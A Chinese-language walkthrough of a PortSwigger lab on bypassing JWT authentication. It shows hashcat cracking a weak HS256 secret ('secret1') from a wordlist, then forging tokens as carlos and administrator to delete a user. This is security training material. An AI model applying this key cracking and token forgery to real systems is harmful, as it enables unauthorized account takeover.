# 实验：通过弱签名密钥绕过 JWT 身份验证

本实验使用基于 JWT 的机制来处理会话。它使用一个极其薄弱的密钥来签署和验证令牌。这可以使用[常见密钥字典列表](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)轻松暴力破解。

要解决本实验，首先暴力破解网站的密钥。获得密钥后，使用它签署一个修改后的会话令牌，使您能够访问 `/admin` 下的管理面板，然后删除用户 `carlos`。

您可以使用以下凭据登录自己的账户：`wiener:peter`

> **提示**
>
> 我们建议在尝试本实验之前，先熟悉[如何在 Burp Suite 中使用 JWT](/burp/documentation/desktop/testing-workflow/vulnerabilities/session-management/jwts)。
>
> 我们还建议使用 hashcat 来暴力破解密钥。有关如何操作的详细信息，请参阅[使用 hashcat 暴力破解密钥](/web-security/jwt#brute-forcing-secret-keys-using-hashcat)。

## 步骤

探测
- 使用凭据登录后，服务器响应
    ```http
    HTTP/2 302 Found
    Location: /my-account?id=wiener
    Set-Cookie: session=eyJraWQiOiIzYjUxZWU2Yi1kZjUyLTRlMjctOTI5MC1jOWNjOGM4MTg5ZGMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NjcwODUzMSwic3ViIjoid2llbmVyIn0.g-qLGoXpO8Zpa5DW-onyA7Ro6qyIUfAK6m8cK3FHJ6k; Secure; HttpOnly; SameSite=None
    ```
    - 应用程序使用 JWT 作为会话 cookie
        ```json
        {
            "kid": "3b51ee6b-df52-4e27-9290-c9cc8c8189dc",
            "alg": "HS256"
        }
        {
            "iss": "portswigger",
            "exp": 1786708531,
            "sub": "wiener"
        }
        ```

尝试暴破密钥
- 将 jwt 保存到文件 `jwt.txt` 中，下载 jwt 密钥字典为 `jwt.secrets.list`
- 使用 hashcat 的 JWT 模式暴破
    ```sh
    hashcat -a 0 -m 16500 jwt.txt jwt.secrets.list
    ```
    - 显示异常 
        ```log
        * Device #1: Not enough allocatable device memory or free host memory for mapping.
        ```
    - 显式指定设备
        ```sh
        hashcat -a 0 -m 16500 -D 1 jwt.txt jwt.secrets.list
        ```
    - 成功暴破
        ```log
        eyJraWQiOiIzYjUxZWU2Yi1kZjUyLTRlMjctOTI5MC1jOWNjOGM4MTg5ZGMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NjcwODUzMSwic3ViIjoid2llbmVyIn0.g-qLGoXpO8Zpa5DW-onyA7Ro6qyIUfAK6m8cK3FHJ6k:secret1
        ```
    - 秘密为 `secret1`

使用密钥创建 JWT 对称密钥
- 编辑器中新建对称密钥，选择指定秘密并粘贴之前获取的秘密 `secret1`
- 在重复器的 JWT 标签中使用对称密钥签名
    ```json
    {
        "iss": "portswigger",
        "exp": 1786709548,
        "sub": "carlos"
    }
    ```
    - 创建的新 JWT 成功访问 carlos 的用户页面

- 构建管理员 JWT，设置用户名并使用对称密钥签名
    ```json
    {
        "iss": "portswigger",
        "exp": 1786709548,
        "sub": "administrator"
    }
    ```
    - 成功访问管理员账户页面
    - 复制 JWT cookie 到浏览器并访问 `/admin` 端点删除目标用户
